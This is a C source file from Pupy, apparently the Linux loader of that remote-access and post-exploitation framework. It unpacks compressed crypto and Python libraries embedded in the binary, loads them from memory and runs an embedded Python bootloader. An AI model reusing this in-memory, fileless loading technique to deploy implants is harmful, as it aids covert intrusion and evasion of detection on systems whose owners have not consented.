/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#define _GNU_SOURCE
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <limits.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/mman.h>
#include "pupy_load.h"
#include "Python-dynload.h"

#include "_memimporter.h"
#include "tmplibrary.h"
#include "debug.h"

#include "resources_bootloader_pyc.c"
#include "resources_python27_so.c"
#include "resources_libssl_so.c"
#include "resources_libcrypto_so.c"

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) initpupy(void);

// Simple trick to get the current pupy arch
#ifdef __x86_64__
	const uint32_t dwPupyArch = 64;
#else
	const uint32_t dwPupyArch = 32;
#endif

#include "lzmaunpack.c"

static inline void* xz_dynload(const char *soname, const char *xzbuf, size_t xzsize) {
	void *uncompressed = NULL;
	size_t uncompressed_size = 0;

	uncompressed = lzmaunpack(xzbuf, xzsize, &uncompressed_size);

	if (!uncompressed) {
		dprint("%s decompression failed\n", soname);
		abort();
	}

	void *res = memdlopen(soname, (char *) uncompressed, uncompressed_size);

	free(uncompressed);

	if (!res) {
		dprint("loading %s from memory failed\n", soname);
		abort();
	}

	return res;
}

uint32_t mainThread(int argc, char *argv[], bool so) {

	int rc = 0;
	PyObject *m=NULL, *d=NULL, *seq=NULL;
	PyObject *mod;
	char * ppath;
	FILE * f;
	uintptr_t cookie = 0;
	PyGILState_STATE restore_state;


	xz_dynload("libcrypto.so.1.0.0", resources_libcrypto_so_start, resources_libcrypto_so_size);
	xz_dynload("libssl.so.1.0.0", resources_libssl_so_start, resources_libssl_so_size);

	if(!Py_IsInitialized) {
		_load_python(
			xz_dynload("libpython2.7.so", resources_python27_so_start, resources_python27_so_size)
		);
	}

	munmap(resources_libcrypto_so_start, resources_libcrypto_so_size);
	munmap(resources_libssl_so_start, resources_libssl_so_size);
	munmap(resources_python27_so_start, resources_python27_so_size);

	dprint("calling PyEval_InitThreads() ...\n");
	PyEval_InitThreads();
	dprint("PyEval_InitThreads() called\n");

	if(!Py_IsInitialized()) {
		dprint("Py_IsInitialized\n");

		Py_IgnoreEnvironmentFlag = 1;
		Py_NoSiteFlag = 1; /* remove site.py auto import */

		dprint("INVOCATION NAME: %s\n", program_invocation_name);
		Py_SetProgramName(program_invocation_name);

		dprint("Initializing python.. (%p)\n", Py_Initialize);
		Py_InitializeEx(0);

		dprint("SET ARGV\n");
		if (argc > 0) {
			if (so) {
				if (argc > 2 && !strcmp(argv[1], "--pass-args")) {
					argv[1] = argv[0];
					PySys_SetArgvEx(argc - 1, argv + 1, 0);
				} else {
					PySys_SetArgvEx(1, argv, 0);
				}
			} else {
				PySys_SetArgvEx(argc, argv, 0);
			}
		}

		PySys_SetPath(".");
#ifndef DEBUG
		PySys_SetObject("frozen", PyBool_FromLong(1));
#endif

		dprint("Py_Initialize() complete\n");
	}
	restore_state=PyGILState_Ensure();

	init_memimporter();
	dprint("init_memimporter()\n");
	initpupy();
	dprint("initpupy()\n");

	/* We execute then in the context of '__main__' */
	dprint("starting evaluating python code ...\n");
	m = PyImport_AddModule("__main__");
	if (m) d = PyModule_GetDict(m);
	if (d) seq = PyObject_lzmaunpack(
		resources_bootloader_pyc_start,
		resources_bootloader_pyc_size
	);

	munmap(resources_bootloader_pyc_start, resources_bootloader_pyc_size);

	if (seq) {
		Py_ssize_t i, max = PySequence_Length(seq);
		for (i=0;i<max;i++) {
			dprint("LOAD SEQUENCE %d\n", i);
			PyObject *sub = PySequence_GetItem(seq, i);
			if (seq) {
				PyObject *discard = PyEval_EvalCode((PyCodeObject *)sub, d, d);
				if (!discard) {
					dprint("discard\n");
					PyErr_Print();
					rc = 255;
				}
				Py_XDECREF(discard);
				/* keep going even if we fail */
			}
			Py_XDECREF(sub);
		}
	}
	dprint("complete ...\n");
	PyGILState_Release(restore_state);
	Py_Finalize();
	dprint("exit ...\n");
	return 0;
}
